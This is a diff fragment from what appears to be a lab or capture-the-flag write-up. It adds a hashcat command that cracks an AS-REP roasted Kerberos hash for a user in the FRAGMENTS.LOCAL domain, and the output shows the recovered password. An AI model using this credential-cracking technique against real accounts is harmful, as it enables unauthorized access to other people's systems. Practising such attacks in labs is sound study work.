@@ -526,5 +526,11 @@ $krb5asrep$23$o.rodrigo@FRAGMENTS.LOCAL:dedd90af65196a4b0cb853d2f8006588$a53ee4a
 I now have the hash, so ill try to crack it!
 
 ```python
+hashcat ASREProastables.txt /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$o.rodrigo@FRAGMENTS.LOCAL:dedd90af65196a4b0cb853d2f8006588$a53ee4a6919462a6355c2e14b04f3679de49e30798fed5f4948a98f0635abb1bedb2f75a718b7dec7e52c1485076361d955e34f762f23c0de39bd3ef0a02eeb9f4db8f4ce94d49970dc6a8b8ccc6b97706396d8ab2f4fa8982cc0867f8dd305a7f8f9a9fa6cb62ad6098091b6961b814a80234bfa2cf0ef4105a67db0aaaadb6d7825b283ce78955ad776d0af58def226e058e1c74e089356b0a35ff21d9c4a0775585f19cea038c858d6bfb7b871fcd173a3f1221aef1bb364d089ab7f2fec9622499ff2459d8f7058a39011cbdfd252f52ab3420578c1b246eb1fe8a0269c89a480a3a2a083d57b8d8ecaa0c9011054f57:nohacking!
+```
+
+```python
 
 ```
